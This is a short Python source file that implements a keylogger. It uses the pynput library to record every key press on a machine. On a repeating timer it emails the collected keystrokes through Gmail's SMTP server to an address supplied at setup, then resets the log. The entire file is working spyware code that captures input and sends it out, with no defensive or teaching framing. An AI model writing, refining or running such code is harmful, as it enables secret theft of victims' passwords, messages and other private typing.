# --------- KEY LOGGER using pynput-----------
import pynput
import threading
import smtplib

class Keylogger:
    def __init__(self,time_interval,email,password):
        self.interval=time_interval
        self.log="----Keylogging started-----"
        self.email=email
        self.password=password
    def append_to_log(self,string):
        self.log=self.log + string
    
    def process_key_press(self,key):
        try:
            current_key=key.char
        except AttributeError:
            
            if key==key.space:
                current_key=" "
            else:
                current_key= " "+ str(key)+" "
        self.append_to_log(current_key)
        
    def report(self):
        #sending the mail
        self.send_mail(self.email,self.password,"\n\n"+self.log)  
        # once we send the log file reset it to capture new key strokes
        self.log=""
        #wait for some time lets say 5 seconds to gather new keystrokes for reporting 
        timer= threading.Timer(self.interval,self.report) #once keystrokes are gathered report function starts  reporting by calling itself
        timer.start()
    def send_mail(self,email,password,message):
        #create a server instance
        server = smtplib.SMTP("smtp.gmail.com",587)
        #start tls connection
        server.starttls()
        # login to mail
        server.login(email,password)
        #send mail
        server.sendmail(email,email,message)
        server.quit()
            
    def start(self):   
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener as listener:
            self.report()
            listener.join()
        